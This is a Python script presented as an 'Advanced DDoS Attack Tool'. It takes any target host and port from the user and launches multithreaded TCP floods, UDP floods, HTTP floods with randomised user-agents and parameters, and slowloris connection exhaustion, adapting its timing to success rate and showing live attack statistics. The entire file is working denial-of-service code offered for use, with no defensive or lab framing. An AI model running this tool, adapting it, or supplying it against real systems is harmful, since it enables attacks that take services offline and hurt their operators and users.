import socket
import threading
import time
import random
import logging
from collections import deque
from rich.console import Console
from rich.table import Table
import requests

console = Console()

class AdvancedDDoSAttacker:
    def __init__(self, target_host='localhost', target_port=80):
        self.target_host = target_host
        self.target_port = target_port
        self.running = True
        self.attack_stats = {
            'packets_sent': 0,
            'bytes_sent': 0,
            'successful_connections': 0,
            'failed_connections': 0
        }
        self.config = {
            'min_payload_size': 100,
            'max_payload_size': 2000,
            'min_delay': 0.01,
            'max_delay': 0.5,
            'burst_size': 50,
            'adaptive_threshold': 0.7
        }
        self.performance_metrics = deque(maxlen=1000)
        self.blocked_ips = set()
        
        logging.basicConfig(
            filename='attacker.log',
            level=logging.INFO,
            format='%(asctime)s - %(levelname)s - %(message)s'
        )
        
    def tcp_flood(self):
        while self.running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(2)
                start_time = time.time()
                sock.connect((self.target_host, self.target_port))
                payload_size = random.randint(
                    self.config['min_payload_size'],
                    self.config['max_payload_size']
                )
                payload = self.generate_payload(payload_size)
                sock.send(payload)
                self.attack_stats['packets_sent'] += 1
                self.attack_stats['bytes_sent'] += len(payload)
                self.attack_stats['successful_connections'] += 1
                response_time = time.time() - start_time
                self.performance_metrics.append({
                    'time': time.time(),
                    'response_time': response_time,
                    'success': True
                })
                sock.close()
                
                if self.get_success_rate() > self.config['adaptive_threshold']:
                    time.sleep(random.uniform(
                        self.config['min_delay'],
                        self.config['min_delay'] * 2
                    ))
                else:
                    time.sleep(random.uniform(
                        self.config['min_delay'] * 2,
                        self.config['max_delay']
                    ))
                    
            except Exception as e:
                self.attack_stats['failed_connections'] += 1
                self.performance_metrics.append({
                    'time': time.time(),
                    'response_time': None,
                    'success': False
                })
                time.sleep(1)
                
    def udp_flood(self):
        while self.running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                for _ in range(self.config['burst_size']):
                    payload_size = random.randint(
                        self.config['min_payload_size'],
                        self.config['max_payload_size']
                    )
                    payload = self.generate_payload(payload_size)
                    sock.sendto(payload, (self.target_host, self.target_port))
                    self.attack_stats['packets_sent'] += 1
                    self.attack_stats['bytes_sent'] += len(payload)
                sock.close()
                time.sleep(random.uniform(
                    self.config['min_delay'],
                    self.config['max_delay']
                ))
                
            except Exception as e:
                self.attack_stats['failed_connections'] += 1
                time.sleep(1)
                
    def http_flood(self):
        while self.running:
            try:
                methods = ['GET', 'POST', 'PUT', 'DELETE']
                method = random.choice(methods)
                headers = {
                    'User-Agent': self.generate_user_agent(),
                    'Accept': 'text/html,application/json,*/*',
                    'Accept-Language': 'en-US,en;q=0.9',
                    'Connection': 'keep-alive'
                }
                params = {
                    f'param_{i}': self.generate_random_string(10)
                    for i in range(random.randint(1, 5))
                }
                url = f"http://{self.target_host}:{self.target_port}/"
                start_time = time.time()
                response = requests.request(
                    method,
                    url,
                    headers=headers,
                    params=params,
                    timeout=5
                )
                self.attack_stats['packets_sent'] += 1
                self.attack_stats['successful_connections'] += 1
                response_time = time.time() - start_time
                self.performance_metrics.append({
                    'time': time.time(),
                    'response_time': response_time,
                    'success': True
                })
                time.sleep(random.uniform(
                    self.config['min_delay'],
                    self.config['max_delay']
                ))
                
            except Exception as e:
                self.attack_stats['failed_connections'] += 1
                self.performance_metrics.append({
                    'time': time.time(),
                    'response_time': None,
                    'success': False
                })
                time.sleep(1)
                
    def slowloris_attack(self):
        sockets = []
        while self.running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(4)
                sock.connect((self.target_host, self.target_port))
                sock.send(
                    f"GET /?{random.randint(0, 2000)} HTTP/1.1\r\n".encode('utf-8')
                )
                sock.send(f"Host: {self.target_host}\r\n".encode('utf-8'))
                sock.send("X-a: ".encode('utf-8'))
                sockets.append(sock)
                self.attack_stats['packets_sent'] += 1
                
                for s in list(sockets):
                    try:
                        s.send("X-a: {}\r\n".encode('utf-8'))
                    except:
                        sockets.remove(s)
                        
                if len(sockets) > 1000:
                    time.sleep(random.uniform(1, 3))
                    
            except Exception as e:
                self.attack_stats['failed_connections'] += 1
                time.sleep(1)
                
    def generate_payload(self, size):
        return ''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZ', k=size)).encode()
        
    def generate_user_agent(self):
        browsers = ['Chrome', 'Firefox', 'Safari', 'Edge']
        versions = ['86.0', '87.0', '88.0', '89.0']
        os_list = ['Windows NT 10.0', 'Macintosh', 'X11']
        return f"Mozilla/5.0 ({random.choice(os_list)}) {random.choice(browsers)}/{random.choice(versions)}"
        
    def generate_random_string(self, length):
        chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
        return ''.join(random.choices(chars, k=length))
        
    def get_success_rate(self):
        recent_attempts = list(self.performance_metrics)[-100:]
        if not recent_attempts:
            return 1.0
        successes = sum(1 for x in recent_attempts if x['success'])
        return successes / len(recent_attempts)
        
    def display_stats(self):
        while self.running:
            table = Table(title="Attack Statistics")
            table.add_column("Metric", style="cyan")
            table.add_column("Value", style="magenta")
            table.add_row("Packets Sent", str(self.attack_stats['packets_sent']))
            table.add_row("Bytes Sent", f"{self.attack_stats['bytes_sent'] / 1024:.2f} KB")
            table.add_row("Successful Connections", str(self.attack_stats['successful_connections']))
            table.add_row("Failed Connections", str(self.attack_stats['failed_connections']))
            table.add_row("Success Rate", f"{self.get_success_rate():.2%}")
            console.clear()
            console.print(table)
            time.sleep(1)
            
    def start_attack(self, attack_type='all', threads=5):
        attack_functions = {
            'tcp': self.tcp_flood,
            'udp': self.udp_flood,
            'http': self.http_flood,
            'slowloris': self.slowloris_attack
        }
        
        if attack_type == 'all':
            attack_functions_to_use = list(attack_functions.values())
        else:
            attack_functions_to_use = [attack_functions[attack_type]]
            
        attack_threads = []
        for func in attack_functions_to_use:
            for _ in range(threads):
                thread = threading.Thread(target=func)
                thread.daemon = True
                thread.start()
                attack_threads.append(thread)
                
        stats_thread = threading.Thread(target=self.display_stats)
        stats_thread.daemon = True
        stats_thread.start()
        
        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            self.running = False
            console.print("\n[red]Stopping attack...[/red]")
            for thread in attack_threads:
                thread.join()

def main():
    console.print("[bold cyan]Advanced DDoS Attack Tool[/bold cyan]")
    target_host = console.input("[bold yellow]Enter target host: [/bold yellow]")

    while True:
        try:
            target_port = int(console.input("[bold yellow]Enter target port: [/bold yellow]"))
            if 1 <= target_port <= 65535:
                break
            else:
                console.print("[red]Port must be between 1 and 65535.[/red]")
        except ValueError:
            console.print("[red]Invalid input. Please enter a valid port number.[/red]")

    console.print("\n[bold]Available attack types:[/bold]")
    console.print("1. TCP Flood")
    console.print("2. UDP Flood")
    console.print("3. HTTP Flood")
    console.print("4. Slowloris")
    console.print("5. All")

    attack_choice = console.input("\n[bold yellow]Select attack type (1-5): [/bold yellow]")
    attack_types = ['tcp', 'udp', 'http', 'slowloris', 'all']
    attack_type = attack_types[int(attack_choice) - 1]

    threads = int(console.input("[bold yellow]Enter number of threads per attack type: [/bold yellow]"))

    attacker = AdvancedDDoSAttacker(target_host, target_port)

    console.print(f"\n[bold green]Starting {attack_type} attack with {threads} threads...[/bold green]")
    attacker.start_attack(attack_type, threads)

if __name__ == "__main__":
    main()
